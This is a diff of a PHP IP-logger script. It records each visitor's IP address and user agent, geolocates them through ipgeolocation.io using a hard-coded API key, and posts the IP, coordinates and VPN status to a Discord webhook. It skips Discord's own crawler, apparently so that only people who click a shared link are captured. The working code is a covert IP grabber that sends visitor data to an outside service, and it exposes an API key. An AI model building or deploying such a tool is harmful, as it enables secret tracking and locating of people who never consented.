@@ -5,12 +5,10 @@ class IpLogger {
         $ip = $_SERVER['REMOTE_ADDR'];
         $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
-        // Check if the user agent is a known bot or web crawler or Discord
         if ($this->isBot($userAgent) || $this->isDiscordUserAgent($userAgent)) {
-            return; // Skip logging if it's a bot, web crawler, or Discord user agent
+            return;
         }
 
-        // Get IP geolocation data
         $geoData = $this->getIpGeoData($ip);
 
         if ($geoData === null) {
@@ -18,16 +16,16 @@ class IpLogger {
             return;
         }
 
-        // Prepare log entry with timestamp
         $timestamp = (new DateTime('now', new DateTimeZone($timezone)))->format('Y-m-d H:i:s');
         $logEntry = "$timestamp - IP: $ip - User Agent: $userAgent\n";
 
-        // Write log entry to file
-        if (file_put_contents($filename, $logEntry, FILE_APPEND) === false) {
-            error_log("Failed to write to file: $filename");
+        if ($file = fopen($filename, 'a')) {
+            fwrite($file, $logEntry);
+            fclose($file);
+        } else {
+            error_log("Failed to open file for writing: $filename");
         }
 
-        // Send data to Discord
         $discord = new Discord();
         $response = $discord->sendIpToDiscord($ip, $userAgent, $geoData);
         if ($response === false) {
@@ -36,24 +34,22 @@ class IpLogger {
     }
 
     private function getIpGeoData($ip) {
-        $apiKey = 'c3ff1ab93dd84d8f991646bd33e2bbf8'; // Replace with your ipgeolocation.io API key
+        $apiKey = 'c3ff1ab93dd84d8f991646bd33e2bbf8';
         $url = "https://api.ipgeolocation.io/ipgeo?apiKey=$apiKey&ip=$ip";
 
         $curl = curl_init($url);
-        curl_setopt_array($curl, [
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_TIMEOUT => 10, // Added timeout for better performance
-        ]);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
         $response = curl_exec($curl);
         curl_close($curl);
 
         if ($response === false) {
-            error_log("Failed to retrieve geolocation data for IP: $ip");
+            error_log("Failed to retrieve coordinates for IP: $ip");
             return null;
         }
 
         $data = json_decode($response, true);
-        if (isset($data['latitude'], $data['longitude'])) {
+
+        if (isset($data['latitude']) && isset($data['longitude'])) {
             return [
                 'latitude' => $data['latitude'],
                 'longitude' => $data['longitude'],
@@ -94,22 +90,24 @@ class Discord {
         $fields = [
             [
                 "name" => "IP",
-                "value" => $ip,
+                "value" => "$ip",
                 "inline" => true
             ],
             [
                 "name" => "User Agent",
-                "value" => $userAgent,
+                "value" => "$userAgent",
                 "inline" => false
             ]
         ];
 
         if ($geoData) {
-            $fields[] = [
-                "name" => "VPN",
-                "value" => $geoData['is_vpn'] ? 'Yes' : 'No',
-                "inline" => true
-            ];
+            if ($geoData['is_vpn']) {
+                $fields[] = [
+                    "name" => "VPN",
+                    "value" => "Yes",
+                    "inline" => true
+                ];
+            }
 
             $fields[] = [
                 "name" => "Coordinates",
@@ -125,34 +123,33 @@ class Discord {
         }
 
         $InfoArr = [
-            "username" => $WebhookName,
+            "username" => "$WebhookName",
             "embeds" => [
                 [
                     "title" => "User Information",
                     "color" => 39423,
-                    "fields" => $fields
+                    "fields" => $fields,
                 ]
-            ]
+            ],
         ];
 
         $JSON = json_encode($InfoArr);
 
-        $curl = curl_init($Webhook);
-        curl_setopt_array($curl, [
-            CURLOPT_HTTPHEADER => ['Content-type: application/json'],
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => $JSON,
-            CURLOPT_RETURNTRANSFER => true
-        ]);
+        $Curl = curl_init($Webhook);
+        curl_setopt($Curl, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
+        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
+        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
+        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
 
-        $response = curl_exec($curl);
-        if (curl_errno($curl)) {
-            error_log('cURL error: ' . curl_error($curl));
-            curl_close($curl);
+        $response = curl_exec($Curl);
+
+        if (curl_errno($Curl)) {
+            error_log('cURL error: ' . curl_error($Curl));
+            curl_close($Curl);
             return false;
         }
 
-        curl_close($curl);
+        curl_close($Curl);
         return $response;
     }
 }
